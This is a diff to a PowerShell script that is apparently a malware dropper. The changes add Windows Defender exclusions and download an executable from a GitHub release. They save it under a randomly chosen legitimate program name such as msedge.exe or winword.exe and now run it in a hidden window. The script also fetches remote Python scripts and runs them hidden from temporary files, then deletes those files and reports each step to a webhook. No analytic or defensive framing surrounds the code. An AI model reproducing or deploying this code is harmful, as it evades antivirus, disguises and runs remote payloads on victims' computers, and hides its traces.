@@ -89,8 +89,10 @@ try {
     }
 
     if ($exclusionsAdded -and $directories) {
+        $exeNames = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
+        $selectedExe = $exeNames | Get-Random
         $randomDir = $directories | Get-Random
-        $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath "msedge.exe"
+        $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath $selectedExe
         try {
             Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
             Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
@@ -101,16 +103,18 @@ try {
         $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
         try {
             Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Downloaded msedge.exe to $destinationPath"
+            Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
+            Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+            Send-WebhookMessage -Message "Executed $selectedExe"
         } catch {
-            Send-WebhookMessage -Message "Error downloading msedge.exe: $_"
+            Send-WebhookMessage -Message "Error downloading or executing $selectedExe: $_"
         }
     }
 
     $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
     try {
         $response = Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing -ErrorAction Stop
-        $pythonCode = [System.Text.Encoding]::UTF8.GetString($response.Content)
+        $pythonCode = $response.Content | Out-String
         Send-WebhookMessage -Message "Downloaded Python script"
         
         $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
@@ -121,13 +125,17 @@ try {
         } else {
             if ($pythonwExists) {
                 try {
-                    Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.pyw"
+                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                     Send-WebhookMessage -Message "Executed Python script with pythonw.exe"
                 } catch {
                     Send-WebhookMessage -Message "Error executing with pythonw.exe: $_"
                     if ($pythonExists) {
                         try {
-                            Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
+                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                             Send-WebhookMessage -Message "Executed Python script with python.exe"
                         } catch {
                             Send-WebhookMessage -Message "Error executing with python.exe: $_"
@@ -135,13 +143,23 @@ try {
                     } else {
                         Send-WebhookMessage -Message "python.exe not found, cannot fallback"
                     }
+                } finally {
+                    if (Test-Path $tempScriptPath) {
+                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
+                    }
                 }
             } elseif ($pythonExists) {
                 try {
-                    Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
+                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                     Send-WebhookMessage -Message "Executed Python script with python.exe"
                 } catch {
                     Send-WebhookMessage -Message "Error executing with python.exe: $_"
+                } finally {
+                    if (Test-Path $tempScriptPath) {
+                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
+                    }
                 }
             }
         }
@@ -152,7 +170,7 @@ try {
     $toolsUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/toolhandler.py"
     try {
         $response = Invoke-WebRequest -Uri $toolsUrl -UseBasicParsing -ErrorAction Stop
-        $pythonCode = [System.Text.Encoding]::UTF8.GetString($response.Content)
+        $pythonCode = $response.Content | Out-String
         Send-WebhookMessage -Message "Downloaded toolhandler Python script"
         
         $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
@@ -163,13 +181,17 @@ try {
         } else {
             if ($pythonwExists) {
                 try {
-                    Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.pyw"
+                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                     Send-WebhookMessage -Message "Executed toolhandler Python script with pythonw.exe"
                 } catch {
                     Send-WebhookMessage -Message "Error executing toolhandler with pythonw.exe: $_"
                     if ($pythonExists) {
                         try {
-                            Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
+                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                             Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
                         } catch {
                             Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
@@ -177,13 +199,23 @@ try {
                     } else {
                         Send-WebhookMessage -Message "python.exe not found, cannot fallback for toolhandler"
                     }
+                } finally {
+                    if (Test-Path $tempScriptPath) {
+                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
+                    }
                 }
             } elseif ($pythonExists) {
                 try {
-                    Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
+                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                     Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
                 } catch {
                     Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
+                } finally {
+                    if (Test-Path $tempScriptPath) {
+                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
+                    }
                 }
             }
         }
